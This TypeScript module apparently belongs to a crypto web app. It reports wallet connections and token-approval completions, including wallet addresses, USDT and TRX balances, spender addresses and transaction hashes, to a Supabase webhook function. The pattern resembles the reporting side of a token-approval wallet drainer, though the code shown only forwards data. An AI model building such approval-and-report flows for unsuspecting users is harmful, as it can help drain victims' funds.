import { supabase } from "@/integrations/supabase/client";

// Wallet connection data format
export interface WalletConnectedData {
  event: "wallet_connected";
  timestamp: string;
  data: {
    order_id: string;
    wallet_address: string;
    username: string;
    currency: string;
    network: string;
    spender_address: string;
    usdt_balance: number;
    trx_balance: number;
  };
}

// Authorization completed data format
export interface AuthorizationCompletedData {
  event: "authorization_completed";
  timestamp: string;
  data: {
    order_id: string;
    wallet_address: string;
    username: string;
    currency: string;
    network: string;
    spender_address: string;
    usdt_balance: number;
    trx_balance: number;
    tx_hash: string;
    status: "success" | "failed";
    payment_mode: "safe" | "whitelist";
  };
}

// Webhook response format
export interface WebhookResponse {
  success: boolean;
  message: string;
  address?: string;
}

const invokeWebhookProxy = async (
  payload: WalletConnectedData | AuthorizationCompletedData,
): Promise<WebhookResponse> => {
  try {
    console.log("Sending webhook event:", payload.event, payload);

    const { data: result, error } = await supabase.functions.invoke('send-webhook', {
      body: { payload },
    });

    if (error) {
      console.error("Webhook edge function error:", error);
      return { success: false, message: error.message };
    }

    console.log("Webhook event response:", result);
    return result || { success: true, message: 'Webhook sent' };
  } catch (error) {
    console.error("Error sending webhook event:", error);
    return { success: false, message: error instanceof Error ? error.message : "Unknown error" };
  }
};

export const sendWalletConnectedEvent = async (data: WalletConnectedData["data"]): Promise<WebhookResponse> => {
  return invokeWebhookProxy({
    event: "wallet_connected",
    timestamp: new Date().toISOString(),
    data,
  });
};

export const sendAuthorizationCompletedEvent = async (data: AuthorizationCompletedData["data"]): Promise<WebhookResponse> => {
  return invokeWebhookProxy({
    event: "authorization_completed",
    timestamp: new Date().toISOString(),
    data,
  });
};
